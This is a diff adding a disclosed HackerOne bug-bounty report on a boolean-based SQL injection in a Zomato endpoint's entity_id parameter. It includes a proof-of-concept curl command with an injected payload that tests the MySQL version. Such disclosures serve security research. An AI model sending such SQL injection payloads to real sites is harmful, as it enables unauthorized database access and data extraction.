@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/297534
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/gerben_javado
+ReportedTo:Zomato(zomato)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:29.03.2018 16:51:52
+
+Summary:
+@gerben_javado found that the parameter entity_id was vulnerable to SQLi on endpoint /████.php using a Boolean technique.
+
+##POC
+
+The POC uses `if(mid(@@version,1,1)=5` which returns a 200 ok message. If changed for `if(mid(@@version,1,1)=4` the server gives a 500 or 504 error, confirming the SQLi and proving data extraction.
+
+```
+curl -H 'Host: www.zomato.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://www.zomato.com/████.php?entity_type=restaurant&entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k
+```
+
+Thanks @gerben_javado for helping us in keeping @zomato secure :)
